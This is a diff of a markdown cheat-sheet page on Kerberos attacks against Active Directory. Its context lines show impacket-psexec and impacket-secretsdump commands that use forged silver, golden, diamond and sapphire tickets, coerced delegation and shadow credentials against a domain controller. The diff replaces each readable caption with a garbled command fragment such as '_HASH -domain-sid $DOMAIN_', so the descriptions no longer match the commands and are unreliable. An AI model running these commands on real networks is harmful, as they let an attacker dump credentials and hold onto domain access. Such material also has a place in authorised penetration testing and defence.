@@ -3,7 +3,7 @@ id: "qyvhec3vsmpn04vq8"
 title: "kerberos"
 description: ""
 tags: []
-order: 5
+order: "5"
 createdAt: "2026-05-26T19:01:58.304Z"
 updatedAt: "2026-05-26T19:02:17.258Z"
 ---
@@ -234,7 +234,7 @@ export KRB5CCNAME=$USER.ccache
 impacket-psexec $DOMAIN/$USER@$TARGET -k -no-pass
 ```
 
-_Silver Ticket Forge TGS ticket for specific service using service account NTLM hash._
+_HASH -domain-sid $DOMAIN_
 
 **Tags:** kerberos, silver-ticket, ticket-forgery, impacket, lateral-movement, ad-abuse
 <!-- cmd: {"id":"y5smxnfq3mpn054h3","language":"bash","sectionId":"uaqvmz25xmpn054cl","tags":["kerberos","silver-ticket","ticket-forgery","impacket","lateral-movement","ad-abuse"]} -->
@@ -260,7 +260,7 @@ impacket-psexec $DOMAIN/Administrator@$DC -k -no-pass
 impacket-secretsdump $DOMAIN/Administrator@$DC -k -no-pass
 ```
 
-_Golden Ticket Forge TGT using krbtgt NTLM hash — full domain persistence._
+_HASH -domain-sid $DOMAIN_
 
 **Tags:** kerberos, golden-ticket, krbtgt, persistence, ticket-forgery, impacket, ad-abuse
 <!-- cmd: {"id":"r7dn1iaotmpn054ha","language":"bash","sectionId":"wevypl4sgmpn054cq","tags":["kerberos","golden-ticket","krbtgt","persistence","ticket-forgery","impacket","ad-abuse"]} -->
@@ -278,7 +278,7 @@ export KRB5CCNAME=Administrator.ccache
 impacket-psexec $DOMAIN/Administrator@$DC -k -no-pass
 ```
 
-_Diamond Ticket Modify legitimate TGT PAC — stealthier than Golden Ticket._
+_HASH -domain-sid $DOMAIN_
 
 **Tags:** kerberos, diamond-ticket, ticket-forgery, stealth, impacket, ad-abuse
 <!-- cmd: {"id":"9zo5gvdg0mpn054hg","language":"bash","sectionId":"hzo9abo21mpn054cs","tags":["kerberos","diamond-ticket","ticket-forgery","stealth","impacket","ad-abuse"]} -->
@@ -296,7 +296,7 @@ export KRB5CCNAME=Administrator.ccache
 impacket-secretsdump $DOMAIN/Administrator@$DC -k -no-pass
 ```
 
-_Sapphire Ticket Steal PAC from existing legitimate TGT — most stealthy._
+_AES -domain-sid $DOMAIN_
 
 **Tags:** kerberos, sapphire-ticket, ticket-forgery, stealth, impacket, ad-abuse
 <!-- cmd: {"id":"on8ahuy2pmpn054hu","language":"bash","sectionId":"eubl8jdd6mpn054cw","tags":["kerberos","sapphire-ticket","ticket-forgery","stealth","impacket","ad-abuse"]} -->
@@ -333,7 +333,7 @@ export KRB5CCNAME=dc_tgt.ccache
 impacket-secretsdump $DOMAIN/Administrator@$DC -k -no-pass
 ```
 
-_Tags: #kerberos, #unconstrained-delegation, #enum, #netexec, #bloodyad Abuse unconstrained delegation — coerce DC auth and extract TGT._
+_tgt.kirbi dc_
 
 **Tags:** kerberos, unconstrained-delegation, petitpotam, coercer, tgt-extraction, ad-abuse
 <!-- cmd: {"id":"cjz714kmhmpn054i6","language":"bash","sectionId":"7q47o4tw5mpn054d0","tags":["kerberos","unconstrained-delegation","petitpotam","coercer","tgt-extraction","ad-abuse"]} -->
@@ -436,7 +436,7 @@ export KRB5CCNAME=$TARGET_USER.ccache
 impacket-getnthash $DOMAIN/$TARGET_USER -pfx-base64 $PFX_B64 -dc-ip $DC
 ```
 
-_Kerberos Abuse via Shadow Credentials Add Shadow Credentials to target then get TGT._
+_USER -pfx-base64 $PFX_
 
 **Tags:** kerberos, shadow-credentials, pywhisker, pkinit, credential-access, ad-abuse
 <!-- cmd: {"id":"790f5ln7empn054iu","language":"bash","sectionId":"7rpdtxilempn054d6","tags":["kerberos","shadow-credentials","pywhisker","pkinit","credential-access","ad-abuse"]} -->
